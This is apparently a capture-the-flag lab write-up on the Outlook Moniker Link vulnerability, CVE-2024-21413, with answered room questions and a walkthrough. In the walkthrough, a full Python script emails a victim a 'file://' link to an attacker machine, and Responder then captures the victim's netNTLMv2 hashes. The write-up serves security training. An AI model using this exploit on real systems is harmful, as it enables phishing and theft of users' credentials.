**Task 1 - Introduction**

*Q1: What "Severity" rating has the CVE been assigned?*

A: **Critical.** The severity rating of this exploit is 9.8. This is incredibly severe, as it is on a scale of 0 to 10. This is most likely due to the ease of the exploit documented in the CVE.

**Task 2 - Moniker Link (CVE-2024-21413)**

*Q1: What Moniker Link type do we use in the hyperlink?*

A: file://. By using the file:// Moniker Link, we tell Outlook to attempt to access a file. This uses SMB protocol using local credentials for authentication. We need to bypass this, as outlook will block this in protected view.

*Q2: What is the special character used to bypass Outlook's "Protected View"?*

A: **!**. The exclamation point special character and some text in our Moniker Link results in a bypass of Outlook's protected view. From a coding perspective, "!" usually is used as a "not" in boolean logic.

**Task 3 - Exploitation**

**Walkthrough**

Firstly, we need to open responder in our linux machine. enter the following command *responder -I ens5*. We are now listening for packets on this machine.

![alt text](<Images/Moniker-Fig1.png>)

For this exploit, the code is already written for us in the form of a python script. All we have to do is make a file on our linux machine. To do this, we enter the command *nano exploit.py*. In this case exploit.py is our file. Copy and paste the code provided at the beginning of the exercise, or seen here.

```python
'''
Author: CMNatic | https://github.com/cmnatic
Version: 1.0 | 19/02/2024
'''

import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.utils import formataddr

sender_email = 'attacker@monikerlink.thm' # Replace with your sender email address
receiver_email = 'victim@monikerlink.thm' # Replace with the recipient email address
password = input("Enter your attacker email password: ")
html_content = """\
<!DOCTYPE html>
<html lang="en">
    <p><a href="file://ATTACKER_MACHINE/test!exploit">Click me</a></p>

    </body>
</html>"""

message = MIMEMultipart()
message['Subject'] = "CVE-2024-21413"
message["From"] = formataddr(('CMNatic', sender_email))
message["To"] = receiver_email

# Convert the HTML string into bytes and attach it to the message object
msgHtml = MIMEText(html_content,'html')
message.attach(msgHtml)

server = smtplib.SMTP('MAILSERVER', 25)
server.ehlo()
try:
    server.login(sender_email, password)
except Exception as err:
    print(err)
    exit(-1)

try:
    server.sendmail(sender_email, [receiver_email], message.as_string())
    print("\n Email delivered")
except Exception as error:
    print(error)
finally:
    server.quit()
```

We will need to make two modifications to this file before we save it to our system.
1) Modify the Moniker Link (Line 12) in the code to OUR IP Address.
2) Replace the 'MAILSERVER' placeholder on line 31 with the TARGET IP.

Save exploit.py and now, its time to run it. We do this through *python3 exploit.py*
For our password when it prompts you, enter **attacker**.
The script should tell you that the email has been delivered.

We now need to go into the windows machine with Outlook open. We should see and email.

![alt text](<Images/Moniker-fig2.png>)

Click the link. We should now see captured hashes in our responder window on our linux machine!

![alt text](<Images/Moniker-fig3.png>)


*Q1: What is the name of the application that we use on the AttackBox to capture the user's hash?*

A: **Responder** is a listener application that can be used on linux to capture packets. We are using it in this attack to capture a hash through outlook and the clicking of a link.

*Q2: What type of hash is captured once the hyperlink in the email has been clicked?*

A: **netNTLMv2** hashes are being captured. This can be seen via the SMB protocol through are listener that is running as seen above.

**Task 4 - Detection**

A Yara rule has been written to detect this exploit, and you can also see the SMB request via **wireshark**.

**Remember to not click fishy links!**

Thank you for reading!